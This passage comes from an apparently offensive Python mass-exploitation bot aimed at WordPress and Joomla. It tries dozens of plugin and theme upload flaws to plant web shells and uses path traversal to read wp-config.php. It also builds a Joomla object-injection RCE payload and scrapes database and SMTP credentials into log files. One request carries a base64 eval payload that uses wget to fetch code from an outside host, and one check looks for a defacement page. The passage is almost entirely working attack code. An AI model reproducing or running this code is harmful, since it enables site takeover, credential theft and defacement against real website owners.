			print '\033[92m[>] \033[0mExploit Formcraft    \033[91m[Failed] '.format(sn)

			
		#47 pica
		
		picaup = {'uploadfile':(filenames, shell, 'text/html')}
		
		picareq = requests.post(url+'/wp-content/plugins/pica-photo-gallery/picaPhotosResize.php', files=picaup)
		
		picalib = requests.get(url+'/wp-content/uploads/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in picalib.content:
			print '\033[92m[>] \033[0mExploit Pica Photo Gallery    \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Pica Photo Gallery    \033[91m[Failed] '.format(sn)			


		#48 contact-form			
			
		conta = {'action': 'nm_webcontact_upload_file'}
		
		isabo = {'Filedata': (filenames, shell, 'text/html')}

		sonzsreq = requests.post(url+'/wp-admin/admin-ajax.php', data=conta, files=isabo)

		
		
		sonzslib = requests.get(url+'/wp-content/uploads/contact_files/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in sonzslib.content:
			print '\033[92m[>] \033[0mExploit N-media Contact    \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/contact_files/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit N-media Contact    \033[91m[Failed] '.format(sn)


		
		#49 membership
		
		conflib = requests.get(url+"/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=..././..././..././wp-config.php")
				
		if 'DB_USER' in conflib.content:
			print '\033[92m[>] \033[0mExploit Membership Simplified    \033[92m[Done] '.format(sn)
			open('Exploited/ManualConfig.txt', 'a').write(url+'/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=..././..././..././wp-config.php'+'\n')
		else:
			print '\033[92m[>] \033[0mExploit Membership Simplified    \033[91m[Failed] '.format(sn)


		
		#50 ecommerce
		
		confrlib = requests.get(url+"/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../wp-config.php")
				
		if 'DB_USER' in confrlib.content:
			print '\033[92m[>] \033[0mExploit WPecommerce Shop Styling    \033[92m[Done] '.format(sn)
			open('Exploited/ManualConfig.txt', 'a').write(url+'/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../wp-config.php'+'\n')
		else:
			print '\033[92m[>] \033[0mExploit WPecommerce Shop Styling    \033[91m[Failed] '.format(sn)			


		#51 copysafe
			
		contax = {'upload_path': '../../../../uploads/'}
		
		isabox = {'wpcsp_file': (filenames, shell, 'text/html')}

		sonzsxreq = requests.post(url+'/wp-content/plugins/wp-copysafe-pdf/lib/uploadify/uploadify.php', data=contax, files=isabox)

		
		
		sonzsxlib = requests.get(url+'/wp-content/uploads/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in sonzsxlib.content:
			print '\033[92m[>] \033[0mExploit Copysafe    \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Copysafe    \033[91m[Failed] '.format(sn)


		#52 wallimport		

		sonzsdreq = requests.post(url+'/wp-admin/admin-ajax.php?page=pmxi-admin-settings&action=upload&name=Vuln.php', data=shell)
		
		path_dir = os.popen('php -r "print md5(\''+str(path)+'\');"').read()

		
		
		sonzsdlib = requests.get(url+"/wp-content/uploads/wpallimport/uploads/"+str(path_dir)+"/Vuln.php")
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in sonzsdlib.content:
			print '\033[92m[>] \033[0mExploit Wpallimport    \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/wpallimport/uploads/'+path_dir+'/Vuln.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Wpallimport    \033[91m[Failed] '.format(sn)

			
		#53 woocommerce
		
		
		izfreq = requests.post(url+'/produits/?items_per_page=%24%7b%40eval(base64_decode(cGFzc3RocnUoJ2NkIHdwLWNvbnRlbnQvdXBsb2Fkcy8yMDE4LzAxO3dnZXQgaHR0cDovL3d3dy5hd3RjLmFpZHQuZWR1Ly9jb21wb25lbnRzL2NvbV9iMmpjb250YWN0L3VwbG9hZHMvdHh0LnR4dDttdiB0eHQudHh0IGl6b20ucGhwJyk7))%7d&setListingType=grid')
		
		izflib = requests.get(url+'/wp-content/uploads/2018/01/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in izflib.content:
			print '\033[92m[>] \033[0mExploit Woocommerce    \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/01/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Woocommerce    \033[91m[Failed] '.format(sn)

		#53 woocommerce
		
		
		acfup = {'files':(filenames, shell, 'text/html')}
		
		acfreq = requests.post(url+'/wp-content/plugins/woocommerce-custom-t-shirt-designer/includes/templates/template-deep-gray/designit/cs/upload.php', files=acfup)
		
		acflib = requests.get(url+'/wp-content/plugins/woocommerce-custom-t-shirt-designer/includes/templates/template-white/designit/cs/uploadImage/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in acflib.content:
			print '\033[92m[>] \033[0mExploit woocommerce-custom-t-shirt-designer    \033[92m[Done]  '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/woocommerce-custom-t-shirt-designer/includes/templates/template-white/designit/cs/uploadImage/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit woocommerce-custom-t-shirt-designer    \033[91m[Failed]  '.format(sn)	
		
		#54 Frontend
		
		acfup = {'files':(filenames, shell, 'text/html')}
		
		acfreq = requests.post(url+'/wp-content/plugins/acf-frontend-display/js/blueimp-jQuery-File-Upload-d45deb1/server/php/', files=acfup)
		
		acflib = requests.get(url+'/wp-content/uploads/uigen_.year./'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in acflib.content:
			print '\033[92m[>] \033[0mExploit Frontend    \033[92m[Done]  '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/uigen_.year./'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Frontend    \033[91m[Failed]  '.format(sn)		

			
		#55 konzept
			
		appgravs  = {'name':'Files/Vuln.php'}
		
		
		Gravs = {'file':(filename, shell, 'text/html')}

		sonzsxyreq = requests.post(url+'/wp-content/themes/konzept/includes/uploadify/upload.php', data=appgravs, files=Gravs)	
		
		sonzsxylib = requests.get(url+'/wp-content/themes/konzept/includes/uploadify/Vuln.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in sonzsxylib.content:
			print '\033[92m[>] \033[0mExploit Konzept    \033[92m[Done]  '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/konzept/includes/uploadify/Vuln.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Konzept    \033[91m[Failed]  '.format(sn)			

		
		#56 RightNow
		
		acfxup = {'Filedata':(filenames, shell, 'text/html')}
		
		acfxreq = requests.post(url+'/wp-content/themes/RightNow/includes/uploadify/upload_settings_image.php', files=acfxup)
		
		acfxlib = requests.get(url+'/wp-content/uploads/settingsimages/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in acfxlib.content:
			print '\033[92m[>] \033[0mExploit RightNow    \033[92m[Done]  '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/settingsimages/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit RightNow    \033[91m[Failed]  '.format(sn)
			


		#0  pitchprint
		
		aaReflexup = {'Filedata' : (filenames, shell, 'text/html')}
		
		aaReflexreq = requests.post(url+'/wp-content/plugins/pitchprint/uploader/', files=aaReflexup)
		
		aaReflexlib = requests.get(url+'/wp-content/plugins/pitchprint/uploader/files/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
			print '\033[92m[>] \033[0mExploit Pitchprint  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/pitchprint/uploader/files/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Pitchprint  \033[91m[Failed] '.format(sn)



		#0  secure files
		
		aaReflexup = {'Filedata' : (filenames, shell, 'text/html')}
		
		aaReflexreq = requests.post(url+'/wp-content/plugins/omni-secure-files/plupload/examples/upload.php', files=aaReflexup)
		
		aaReflexlib = requests.get(url+'/wp-content/plugins/omni-secure-files/plupload/examples/uploads/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
			print '\033[92m[>] \033[0mExploit Secure Files  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/omni-secure-files/plupload/examples/uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Secure Files  \033[91m[Failed] '.format(sn)



		#0  cubed
		
		aaReflexup = {'Filedata' : (filenames, shell, 'text/html')}
		
		aaReflexreq = requests.post(url+'/wp-content/themes/cubed_v1.2/functions/upload-handler.php', files=aaReflexup)
		
		aaReflexlib = requests.get(url+'/wp-content/uploads/$year/$month/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
			print '\033[92m[>] \033[0mExploit Cubed_v1.2  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/$year/$month/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Cubed_v1.2  \033[91m[Failed] '.format(sn)


		#0  Desktop and iPhone Photo Uploader
		
		aaReflexup = {'Filedata' : (filenames, shell, 'text/html')}
		
		aaReflexreq = requests.post(url+'/wp-content/plugins/i-dump-iphone-to-wordpress-photo-uploader/uploader.php', files=aaReflexup)
		
		aaReflexlib = requests.get(url+'/wp-content/uploads/i-dump-uploads/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
			print '\033[92m[>] \033[0mExploit iPhone Photo Uploader  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/i-dump-uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit iPhone Photo Uploader  \033[91m[Failed] '.format(sn)



		#0  Plugin Nmedia WordPress Member Conversation 1.35.0
		
		aaReflexup = {'Filedata' : (filenames, shell, 'text/html')}
		
		aaReflexreq = requests.post(url+'/wp-content/plugins/wordpress-member-private-conversation/doupload.php', files=aaReflexup)
		
		aaReflexlib = requests.get(url+'/wp-content/uploads/user_uploads/test/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
			print '\033[92m[>] \033[0mExploit Nmedia  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/user_uploads/test/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Nmedia  \033[91m[Failed] '.format(sn)


		#0 WordPress Plugin WordPress File Upload 4.3.3 
		
		aaReflexup = {'Filedata' : (filenames, shell, 'text/html')}
		
		aaReflexreq = requests.post(url+'/wp-admin/options-general.php?page=wordpress_file_upload&action=edit_settings', files=aaReflexup)
		
		aaReflexlib = requests.get(url+'/wp-admin/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
			print '\033[92m[>] \033[0mExploit File Upload  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-admin/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit File Upload  \033[91m[Failed] '.format(sn)


		#0 MoneyTheme Themes XSS
		
		aaReflexup = {'Filedata' : (filenames, shell, 'text/html')}
		
		aaReflexreq = requests.post(url+'/wp-content/themes/MoneyTheme/uploads/upload.php', files=aaReflexup)
		
		aaReflexlib = requests.get(url+'/wp-content/themes/MoneyTheme/uploads/uploads/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
			print '\033[92m[>] \033[0mExploit oneyTheme Themes XSS  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/MoneyTheme/uploads/uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit oneyTheme Themes XSS  \033[91m[Failed] '.format(sn)



		#0 WordPress Checkout
		
		aaReflexup = {'Filedata' : (filenames, shell, 'text/html')}
		
		aaReflexreq = requests.post(url+'/wp-content/plugins/wp-checkout/vendors/uploadify/upload.php', files=aaReflexup)
		
		aaReflexlib = requests.get(url+'/wp-content/uploads/wp-checkout/uploadify/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
			print '\033[92m[>] \033[0mExploit Checkout  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/wp-checkout/uploadify/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Checkout  \033[91m[Failed] '.format(sn)


		#0 WordPress Plugin Logosware Suite Uploader 1.1.6
		
		aaReflexup = {'Filedata' : (filenames, shell, 'text/html')}
		
		aaReflexreq = requests.post(url+'/wp-content/plugins/logosware-suite-uploader/lw-suite-uploader.php', files=aaReflexup)
		
		aaReflexlib = requests.get(url+'/wp-content/plugins/logosware-suite-uploader/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
			print '\033[92m[>] \033[0mExploit Logosware  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/logosware-suite-uploader/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Logosware  \033[91m[Failed] '.format(sn)


		#0 betheme
		
		aaReflexup = {'Filedata' : (filenames, shell, 'text/html')}
		
		aaReflexreq = requests.post(url+'/wp-content/themes/betheme/muffin-options/fields/upload/field_upload.php', files=aaReflexup)
		
		aaReflexlib = requests.get(url+'/wp-content/themes/betheme/muffin-options/fields/upload/Files/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
			print '\033[92m[>] \033[0mExploit Betheme  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/betheme/muffin-options/fields/upload/Files/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Betheme  \033[91m[Failed] '.format(sn)




		#0 multimedia1
		
		aaReflexup = {'Filedata' : (filenames, shell, 'text/html')}
		
		aaReflexreq = requests.post(url+'/wp-content/themes/multimedia1/server/php/', files=aaReflexup)
		
		aaReflexlib = requests.get(url+'/wp-content/themes/multimedia1/server/php/files/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
			print '\033[92m[>] \033[0mExploit Multimedia1  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/multimedia1/server/php/files/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Multimedia1  \033[91m[Failed] '.format(sn)	



		#0 WP_User_Frontend
		
		aaReflexup = {'Filedata' : (filenames, shell, 'text/html')}
		
		aaReflexreq = requests.post(url+'/wp-admin/admin-ajax.php?action=wpuf_file_upload', files=aaReflexup)
		
		aaReflexlib = requests.get(url+'/wp-content/uploads/20/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
			print '\033[92m[>] \033[0mExploit WP_User_Frontend  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/20/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit WP_User_Frontend  \033[91m[Failed] '.format(sn)	


		#0 pagelinesExploit
		
		aaReflexup = {'Filedata' : (filenames, shell, 'text/html')}
		
		aaReflexreq = requests.post(url+'/wp-admin/admin-post.php', files=aaReflexup)
		
		aaReflexlib = requests.get(url+'/wp-content/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
			print '\033[92m[>] \033[0mExploit Pagelines  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Pagelines  \033[91m[Failed] '.format(sn)	
		

		#0 addblockblocker
		
		aaReflexup = {'Filedata' : (filenames, shell, 'text/html')}
		
		aaReflexreq = requests.post(url+'/wp-admin/admin-ajax.php?action=getcountryuser&cs=2', files=aaReflexup)
		
		aaReflexlib = requests.get(url+'/wp-content/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
			print '\033[92m[>] \033[0mExploit Addblockblocker  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Addblockblocker  \033[91m[Failed] '.format(sn)	

		#0 blaze
		
		aaReflexup = {'Filedata' : (filenames, shell, 'text/html')}
		
		aaReflexreq = requests.post(url+'/wp-admin/admin.php?page=blaze_manage', files=aaReflexup)
		
		aaReflexlib = requests.get(url+'/wp-content/uploads/blaze/uploadfolder/big/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
			print '\033[92m[>] \033[0mExploit blaze  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/blaze/uploadfolder/big/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit blaze  \033[91m[Failed] '.format(sn)	
		
		#0viraloptins
		
		aaReflexup = {'Filedata' : (filenames, shell, 'text/html')}
		
		aaReflexreq = requests.post(url+'/wp-content/plugins/viral-optins/api/uploader/file-uploader.php', files=aaReflexup)
		
		aaReflexlib = requests.get(url+'/wp-content/uploads/$year/$month/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
			print '\033[92m[>] \033[0mExploit viral optins  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/$year/$month/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit viral optins  \033[91m[Failed] '.format(sn)	

		#0viraloptins
		
		aaReflexup = {'Filedata' : (indexxx, shell, 'text/html')}
		
		aaReflexreq = requests.post(url+'/wp-content/plugins/viral-optins/api/uploader/file-uploader.php', files=aaReflexup)
		
		aaReflexlib = requests.get(url+'/wp-content/uploads/2019/07/'+indexxx)
		
		
		if 'Hacked By Mister Spy' in aaReflexlib.content:
			print '\033[92m[>] \033[0mExploit viral optins Index \033[92m[Done] '.format(sn)
			open('Exploited/index.txt', 'a').write(url+'/wp-content/uploads/2019/07/'+indexxx+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit viral optins Index  \033[91m[Failed] '.format(sn)
			
		#0 cherry_plugin
		
		aaReflexup = {'Filedata' : (filenames, shell, 'text/html')}
		
		aaReflexreq = requests.post(url+'/wp-content/plugins/cherry-plugin/admin/import-export/upload.php', files=aaReflexup)
		
		aaReflexlib = requests.get(url+'/wp-content/plugins/cherry-plugin/admin/import-export/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
			print '\033[92m[>] \033[0mExploit Cherry Plugin  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/cherry-plugin/admin/import-export/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Cherry Plugin  \033[91m[Failed] '.format(sn)	
			
		#22 purevision	
		
		xnn = {'Filedata' : (filenames, shell, 'text/html')}
		
		xxxxreq = requests.post(url+'/wp-content/themes/purevision/scripts/admin/uploadify/uploadify.php', files=xnn)
		
		zoklib = requests.get(url+'/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in zoklib.content:
			print '\033[92m[>] \033[0mExploit purevision  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit purevision  \033[91m[Failed] '.format(sn)	
			
		#22 levoslideshow	
		
		xxnxx = {'Filedata' : (filenames, shell, 'text/html')}
		
		xxreq = requests.post(url+'/wp-admin/admin.php?page=levoslideshow_manage', files=xxnxx)
		
		bblib = requests.get(url+'/wp-content/uploads/levoslideshow/42_uploadfolder/big/'+filenames)
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bblib.content:
			print '\033[92m[>] \033[0mExploit levoslideshow  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/levoslideshow/42_uploadfolder/big/'+filenames+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit levoslideshow  \033[91m[Failed] '.format(sn)	


			
    except:
        pass		

############################################## Joomla ##############################################

def rce_url(url, user_agent):
	
	try:
		headers = {
		'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3', 
		'x-forwarded-for': user_agent  
		}
		cookies = requests.get(url,headers=headers).cookies
		for _ in range(3):
			response = requests.get(url, headers=headers,cookies=cookies)    
		return response
		
	except:
		pass

def generate_payload(php_payload):
	
	try:
	
		php_payload = "eval({0})".format(php_str_noquotes(php_payload))
	  
		terminate = '\xf0\xfd\xfd\xfd';
		exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
		injected_payload = "{};JFactory::getConfig();exit".format(php_payload)    
		exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
		exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
	  
		return exploit_template
		
	except:
		pass

############################ For SMTP'S ###################################################
def smtps(url):
    req = requests.get(url + '/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[0m[$]\033[0m\033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/smtps.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('SMTPHost: ' + smtphost + '\n')
            joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
            joomla_configs.write('SMTPPass: ' + smtppass + '\n')
            joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n') 				


    req = requests.get(url + '/index.php?option=com_cckjseblod&task=download&file=configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[0m[$]\033[0m\033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/smtps.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('SMTPHost: ' + smtphost + '\n')
            joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
            joomla_configs.write('SMTPPass: ' + smtppass + '\n')
            joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n') 
	



    req = requests.get(url + '/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[0m[$]\033[0m\033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/smtps.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('SMTPHost: ' + smtphost + '\n')
            joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
            joomla_configs.write('SMTPPass: ' + smtppass + '\n')
            joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n') 




    req = requests.get(url + '/administrator/components/com_aceftp/quixplorer/index.php?action=download&dir=&item=configuration.php&order=name&srt=yes', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[0m[$]\033[0m\033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
